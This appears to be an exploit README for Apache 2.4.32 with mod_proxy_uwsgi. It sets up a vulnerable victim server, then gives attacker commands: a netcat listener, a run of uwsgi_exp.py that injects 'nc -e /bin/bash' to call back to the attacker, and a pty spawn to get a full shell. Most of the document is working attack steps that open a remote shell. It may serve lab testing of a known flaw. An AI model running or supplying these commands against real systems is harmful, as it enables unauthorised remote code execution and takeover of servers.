# Exploit
## Victim requirements
* Apache 2.4.32
* mod_proxy_uwsgi enabled

```
sudo apt-get install libapr1-dev libaprutil1-dev libpcre3-dev
wget https://archive.apache.org/dist/httpd/httpd-2.4.32.tar.gz
tar -xvf httpd-2.4.32.tar.gz
cd httpd-2.4.32/
./configure --prefix=/usr/local/apache2 --enable-mods-shared=all --enable-deflate --enable-proxy --enable-proxy-balancer --enable-proxy-http
make
sudo make install
sudo a2enmod proxy_uwsgi
sudo cp /usr/local/apache2/bin/apachectl /etc/init.d/apache2
sudo chmod +x /etc/init.d/apache2
sudo service apache2 start
```
```
# edit file /usr/local/apache2/conf/httpd.conf
<VirtualHost *:80>
    ProxyPass "/" "uwsgi://localhost:8080/"
    LimitRequestFieldSize 1048576
</VirtualHost>
```

## Victim

Start the uswgi server with the following command:
```
uwsgi --puwsgi-socket localhost:8080 --wsgi-file foobar.py
```

## Attacker

Run this commands from the attacker's machine:
```
# start listening for a reverse shell
nc -lvp 1234
```
```
IP_VICTIM=10.0.2.10
IP_ATTACKER=$(hostname -I)
python uwsgi_exp.py -u $IP_VICTIM -c "nc -e /bin/bash $IP_ATTACKER 1234 2>/dev/null &"
```

A reverse shell will be opened on the victim's machine. Spawn a bash shell with the following command:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
